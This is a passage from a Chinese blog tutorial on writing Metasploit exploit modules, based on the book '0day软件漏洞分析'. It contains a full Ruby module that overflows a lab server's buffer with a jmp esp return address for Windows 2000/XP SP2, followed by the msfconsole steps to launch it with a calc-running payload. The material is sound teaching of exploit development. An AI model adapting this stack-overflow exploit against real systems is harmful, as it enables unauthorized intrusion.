+<li>Platform 模块运行平台，MSF 通过这个值来为 exploit 挑选 payload。本例中，该值为win，所以 MSF 将只选用Windows 平台的 payload，BSD 和 Linux 的 payload 将被自动禁用。</li>
+<li>Targets 可以定义多种操作系统版本中的返回地址，本例中定义了 Windows 2000 和 Windows XP SP2 两种，跳转指令选用<code>jmp esp</code>，均来自<code>ntdll.dll</code>。</li>
+<li>payload 对 shellcode 的要求，如大小和禁止使用的字节等。由于漏洞函数使用<code>strcpy</code>函数，故字符串<code>\x00</code>应该被禁用。MSF 会根据这里的设置自动选用编码算法对 shellcode 进行加工以满足测试要求。</li>
+</ol>
+<ul>
+<li>exploit 的定义：</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>  connect<br>  <br>  <span class="hljs-comment"># Create the attack buffer</span><br>  attack_buf = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">200</span> + [target[<span class="hljs-string">&#x27;Ret&#x27;</span>]].pack(<span class="hljs-string">&#x27;V&#x27;</span>) + payload.encoded<br>  <br>  <span class="hljs-comment"># Send the payload to the target</span><br>  sock.put(attack_buf)<br>  <br>  <span class="hljs-comment"># Start the handler and disconnect</span><br>  handler<br>  disconnect<br><span class="hljs-keyword">end</span>  <span class="hljs-comment"># end of exploit</span><br></code></pre></td></tr></table></figure>
+
+<p>需要说明的只有一行。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">attack_buf = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">200</span> + [target[<span class="hljs-string">&#x27;Ret&#x27;</span>]].pack(<span class="hljs-string">&#x27;V&#x27;</span>) + payload.encoded<br></code></pre></td></tr></table></figure>
+
+<p>首先选用 200 个字母 “a” 填充缓冲区。</p>
+<p><code>pack(&#39;V&#39;)</code>的作用是把数据按照 DWORD 逆序，即小端序。</p>
+<p>填充了缓冲区和返回地址后，再连上经过编码的 shellcode，就得到了最终的 attack_buf。其中，payload.encoded会在使用时由 MSF 提示我们手工配置并生成。</p>
+<p>现在使用 MSF 这个模块进行漏洞测试。</p>
+<ol>
+<li>将漏洞服务器按照实验要求编译并 build 成 release，为了体现 “入侵” 的概念，我把 这个target_server 放在一台 Windows 2000 虚拟机中运行。</li>
+<li>把我们的模块放到 exploit 目录下面。</li>
+<li>从开始菜单中启动 msf，查看我们自己开发的 exploit 是否添加成功</li>
+</ol>
+<p>攻击流程：</p>
+<ul>
+<li><code>show exploits</code> 列出所有的 exploit，不过这样很麻烦</li>
+<li><code>search ruby文件名</code> 应该能看到我们添加的模块位于<code>exploit/</code></li>
+<li><code>use exploit/test</code> 选用我们添加的模块</li>
+<li><code>show targets</code> 显示可用的目标操作系统</li>
+<li><code>set target 2</code> 设置测试目标为 Windows Xp 2.0</li>
+<li><code>show payloads</code> 显示可用的 shellcode</li>
+<li><code>set payload windows/exec</code> 这个 shellcode 可以执行一条任意的命令</li>
+<li><code>show options</code> 显示需要配置的信息</li>
+<li><code>set rhost xxx.xxx.xxx.xxx</code> 配置目标的 IP 地址，如在本地测试，则为 127.0.0.1</li>
+<li><code>set rport 7777</code> 设置目标程序使用的端口</li>
+<li><code>set cmd calc</code> 配置 shellcode 待执行的命令，<code>calc</code>用于打开计算器</li>
+<li><code>set exitfunc seh</code> 以 SEH 退出程序</li>
+<li><code>exploit</code> 发送测试数据，执行攻击</li>
+</ul>
+<h2 id="用-MSF-发布-POC"><a href="#用-MSF-发布-POC" class="headerlink" title="用 MSF 发布 POC"></a>用 MSF 发布 POC</h2><p>MSF 开发 Exploit 的好处：</p>
+<ul>
+<li>可重用性：可以轻松搭载各类已有的 shellcode。</li>
+<li>可扩展性：可将一个模块轻易扩展到适应多个操作系统。</li>
+<li>概念清晰：溢出点、返回地址等位置一目了然，方便后续的漏洞分析和修复工作。</li>
+<li>开发迅速：开发过程被简化到按照一定格式 “填入” 相应的数据。</li>
+</ul>
+<p>当需要向外界公布漏洞的技术细节时，一般会用 POC 代码来重现漏洞被触发的过程。由于 MSF 为开发 exploit 提供了方便，越来越多的 POC 开始采用 MSF 的 exploit 模块方式进行发布。</p>
+<p>仍然以上节中的漏洞程序为测试目标。MSF 模块开发的思路基本一样，不同的只是在配置 info 数据结构时 “填写” 更多的信息，让 POC 看起来更加完善，例如，作者信息、版本信息、 漏洞描述信息、其他 URL 引用、CVE 引用等。 完善后的模块如下所示。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;msf/core&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Metasploit3</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Exploit::Remote::Tcp</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(update_info(info,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>        =&gt; <span class="hljs-string">&#x27;failwest_POC&#x27;</span>,<br>      <span class="hljs-string">&#x27;Version&#x27;</span>     =&gt; <span class="hljs-string">&#x27;1.0&#x27;</span>,<br>      <span class="hljs-string">&#x27;Platform&#x27;</span>    =&gt; <span class="hljs-string">&#x27;win&#x27;</span>,<br>      <span class="hljs-string">&#x27;Privileged&#x27;</span>  =&gt; <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&#x27;License&#x27;</span>     =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>      <span class="hljs-string">&#x27;Author&#x27;</span>      =&gt; <span class="hljs-string">&#x27;FAILWEST&#x27;</span>,<br>      <span class="hljs-string">&#x27;Targets&#x27;</span>     =&gt; [<br>        [<span class="hljs-string">&#x27;Windows 2000&#x27;</span>, &#123;<span class="hljs-string">&#x27;Ret&#x27;</span> =&gt; [<span class="hljs-number">200</span>, <span class="hljs-number">0x77F8948B</span>]&#125;],<br>        [<span class="hljs-string">&#x27;Windows XP SP2&#x27;</span>, &#123;<span class="hljs-string">&#x27;Ret&#x27;</span> =&gt; [<span class="hljs-number">200</span>, <span class="hljs-number">0x7C914393</span>]&#125;],<br>      ],<br>      <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>      <span class="hljs-string">&#x27;Payload&#x27;</span>      =&gt; &#123;<br>        <span class="hljs-string">&#x27;Space&#x27;</span>        =&gt; <span class="hljs-number">200</span>,<br>        <span class="hljs-string">&#x27;BadChars&#x27;</span>     =&gt; <span class="hljs-string">&quot;\x00&quot;</span>,<br>        <span class="hljs-string">&#x27;StackAdjustment&#x27;</span> =&gt; -<span class="hljs-number">3500</span>,<br>      &#125;,<br>      <span class="hljs-string">&#x27;Description&#x27;</span>  =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">        This module is exploit practice from the book</span><br><span class="hljs-string">        &quot;Vulnerability Exploit and Analysis Technique&quot;</span><br><span class="hljs-string">        Used only for educational purposes.</span><br><span class="hljs-string">      &#125;</span>,<br>      <span class="hljs-string">&#x27;Arch&#x27;</span>         =&gt; <span class="hljs-string">&#x27;x86&#x27;</span>,<br>      <span class="hljs-string">&#x27;References&#x27;</span>   =&gt; [<br>        [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;http://www.failwest.com&#x27;</span>],<br>        [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;44444&#x27;</span>],<br>      ],<br>      <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;EXITFUNC&#x27;</span> =&gt; <span class="hljs-string">&#x27;process&#x27;</span> &#125;<br>    ))<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment"># end of initialize</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    connect<br>    print_status(<span class="hljs-string">&quot;Sending <span class="hljs-subst">#&#123;payload.encoded.length&#125;</span> byte payload...&quot;</span>)<br><br>    buf = <span class="hljs-string">&#x27;a&#x27;</span> * target[<span class="hljs-string">&#x27;Ret&#x27;</span>][<span class="hljs-number">0</span>]<br>    buf &lt;&lt; [target[<span class="hljs-string">&#x27;Ret&#x27;</span>][<span class="hljs-number">1</span>]].pack(<span class="hljs-string">&#x27;V&#x27;</span>)<br>    buf &lt;&lt; payload.encoded<br><br>    sock.put(buf)<br>    handler<br>    disconnect<br>  <span class="hljs-keyword">end</span> <span class="hljs-comment"># end of exploit</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<p>将其保存为<code>poc.rb</code>，放在正确的目录下，启动 MSF，使用<code>search failwest</code>搜索 POC。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; search failwest<br><br>Matching Modules<br>================<br><br><span class="hljs-meta prompt_">   # </span><span class="language-bash"> Name                         Disclosure Date  Rank    Check  Description</span><br>   -  ----                         ---------------  ----    -----  -----------<br>   0  exploit/poc                  .                normal  No     failwest_POC<br>   1    \_ target: Windows 2000    .                .       .      .<br>   2    \_ target: Windows XP SP2  .                .       .      .<br>   3  exploit/ruby_lab             .                normal  No     failwest_test<br>   4    \_ target: Automatic       .                .       .      .<br>   5    \_ target: Windows 2000    .                .       .      .<br>   6    \_ target: Windows XP SP2  .                .       .      .<br><br><br>Interact with a module by name or index. For example info 6, use 6 or use exploit/ruby_lab<br>After interacting with a module you can manually set a TARGET with set TARGET &#x27;Windows XP SP2&#x27;          .       .      .<br></code></pre></td></tr></table></figure>
+
+<p>其中的 failwest_POC 就是本节扩充过附属信息的模块，第二个没有描述信息的是上节完成的模块。</p>
+<p>我们可以通过命令<code>info 模块名</code>看到我们在模块中填写的信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; info exploit/poc<br><br>       Name: failwest_POC<br>     Module: exploit/poc<br>   Platform: Windows<br>       Arch: x86<br> Privileged: Yes<br>    License: Metasploit Framework License (BSD)<br>       Rank: Normal<br><br>Provided by:<br>  FAILWEST<br><br>Available targets:<br>      Id  Name<br>      --  ----<br>  =&gt;  0   Windows 2000<br>      1   Windows XP SP2<br><br>Check supported:<br>  No<br><br>Basic options:<br>  Name    Current Setting  Required  Description<br>  ----    ---------------  --------  -----------<br>  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit<br>                                     /basics/using-metasploit.html<br>  RPORT                    yes       The target port (TCP)<br><br>Payload information:<br>  Space: 200<br>  Avoid: 1 characters<br><br>Description:<br>  This module is exploit practice from the book<br>  &quot;Vulnerability Exploit and Analysis Technique&quot;<br>  Used only for educational purposes.<br><br>References:<br>  http://www.failwest.com<br>  https://nvd.nist.gov/vuln/detail/CVE-44444<br><br><br>View the full module info with the info -d command.<br></code></pre></td></tr></table></figure>
+
+<p>这样，一个包含了各种附属信息的标准 POC 就完成了。即使对完全不了解我们程序中漏洞的人，通过这个模块也能迅速掌握所有技术细节。</p>
+<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><blockquote>
+<p>参考：0day软件漏洞分析</p>
+</blockquote>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/11/24/wp/24/geek/">2024 极客大挑战 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">MSF 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">MSF 基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-MSF-%E5%88%B6%E4%BD%9C-shellcode"><span class="toc-number">3.</span> <span class="toc-text">利用 MSF 制作 shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9-Payload-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.1.</span> <span class="toc-text">选择 Payload 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-Payload-%E5%8F%82%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">设置 Payload 参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA-Shellcode"><span class="toc-number">3.3.</span> <span class="toc-text">导出 Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-msfvenom-%E5%AF%BC%E5%87%BA-Shellcode"><span class="toc-number">3.4.</span> <span class="toc-text">使用 msfvenom 导出 Shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8-MSF-%E6%89%AB%E6%8F%8F%E8%B7%B3%E6%9D%BF"><span class="toc-number">4.</span> <span class="toc-text">用 MSF 扫描跳板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby-%E8%AF%AD%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">Ruby 语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hello-World"><span class="toc-number">5.1.</span> <span class="toc-text">Hello World!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">5.2.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">5.3.</span> <span class="toc-text">变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C"><span class="toc-number">5.4.</span> <span class="toc-text">字符串操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84"><span class="toc-number">5.5.</span> <span class="toc-text">数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash"><span class="toc-number">5.6.</span> <span class="toc-text">hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD"><span class="toc-number">5.7.</span> <span class="toc-text">条件判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%AA%E7%8E%AF"><span class="toc-number">5.8.</span> <span class="toc-text">循环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">5.9.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97"><span class="toc-number">5.10.</span> <span class="toc-text">模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB"><span class="toc-number">5.11.</span> <span class="toc-text">类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-number">5.12.</span> <span class="toc-text">异常处理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-%E5%BC%80%E5%8F%91"><span class="toc-number">6.</span> <span class="toc-text">Exploit 开发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vuln"><span class="toc-number">6.1.</span> <span class="toc-text">Vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">6.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8-MSF-%E5%8F%91%E5%B8%83-POC"><span class="toc-number">7.</span> <span class="toc-text">用 MSF 发布 POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%A8%80"><span class="toc-number">8.</span> <span class="toc-text">后言</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
